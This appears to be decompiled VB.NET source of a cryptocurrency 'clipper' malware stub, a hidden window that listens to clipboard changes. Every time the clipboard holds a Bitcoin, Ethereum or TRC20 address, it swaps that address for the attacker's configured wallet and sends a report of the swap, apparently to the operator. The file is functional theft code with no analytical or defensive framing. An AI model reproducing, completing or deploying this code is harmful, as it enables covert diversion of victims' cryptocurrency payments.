Imports System
Imports System.Text.RegularExpressions
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
	' Token: 0x02000010 RID: 16
	Public NotInheritable Class ClipboardNotification
		' Token: 0x02000016 RID: 22
		Public Class NotificationForm
			Inherits Form

			' Token: 0x06000088 RID: 136 RVA: 0x00005CE0 File Offset: 0x00003EE0
			Public Sub New()
				Clipper.NativeMethods.SetParent(Me.Handle, Clipper.NativeMethods.intpreclp)
				Clipper.NativeMethods.AddClipboardFormatListener(Me.Handle)
			End Sub

			' Token: 0x06000089 RID: 137 RVA: 0x00005D08 File Offset: 0x00003F08
			Private Function RegexResult(pattern As Regex) As Boolean
				Return pattern.Match(ClipboardNotification.NotificationForm.currentClipboard).Success
			End Function

			' Token: 0x0600008A RID: 138 RVA: 0x00005D34 File Offset: 0x00003F34
			Protected Overrides Sub WndProc(ByRef m As Message)
				If m.Msg = 797 Then
					ClipboardNotification.NotificationForm.currentClipboard = ClipboardFunc.GetText()
					If Me.RegexResult(Clipper.BTCRegex) AndAlso Not ClipboardNotification.NotificationForm.currentClipboard.Contains(Settings.BTC) Then
						Dim obj As Object = Clipper.BTCRegex.Replace(ClipboardNotification.NotificationForm.currentClipboard, Settings.BTC)
						ClipboardFunc.SetText(Conversions.ToString(obj))
						Messages.SendMSG(Conversions.ToString(Operators.ConcatenateObject("BTC Clipper " + ClipboardNotification.NotificationForm.currentClipboard + " : ", obj)))
					End If
					If Me.RegexResult(Clipper.ETHRegex) AndAlso Not ClipboardNotification.NotificationForm.currentClipboard.Contains(Settings.ETH) Then
						Dim obj2 As Object = Clipper.ETHRegex.Replace(ClipboardNotification.NotificationForm.currentClipboard, Settings.ETH)
						ClipboardFunc.SetText(Conversions.ToString(obj2))
						Messages.SendMSG(Conversions.ToString(Operators.ConcatenateObject("ETH Clipper " + ClipboardNotification.NotificationForm.currentClipboard + " : ", obj2)))
					End If
					If Me.RegexResult(Clipper.TRCRegex) AndAlso Not ClipboardNotification.NotificationForm.currentClipboard.Contains(Settings.TRC) Then
						Dim obj3 As Object = Clipper.TRCRegex.Replace(ClipboardNotification.NotificationForm.currentClipboard, Settings.TRC)
						ClipboardFunc.SetText(Conversions.ToString(obj3))
						Messages.SendMSG(Conversions.ToString(Operators.ConcatenateObject("TRC20 Clipper " + ClipboardNotification.NotificationForm.currentClipboard + " : ", obj3)))
					End If
				End If
				MyBase.WndProc(m)
			End Sub

			' Token: 0x17000006 RID: 6
			' (get) Token: 0x0600008B RID: 139 RVA: 0x00005E98 File Offset: 0x00004098
			Protected Overrides ReadOnly Property CreateParams As CreateParams
				Get
					Dim createParams As Object = MyBase.CreateParams
					NewLateBinding.LateSet(createParams, Nothing, "ExStyle", New Object() { Operators.OrObject(NewLateBinding.LateGet(createParams, Nothing, "ExStyle", New Object(-1) {}, Nothing, Nothing, Nothing), 128) }, Nothing, Nothing)
					Return CType(createParams, CreateParams)
				End Get
			End Property

			' Token: 0x0400003B RID: 59
			Private Shared currentClipboard As String = ClipboardFunc.GetText()
		End Class
	End Class
End Namespace
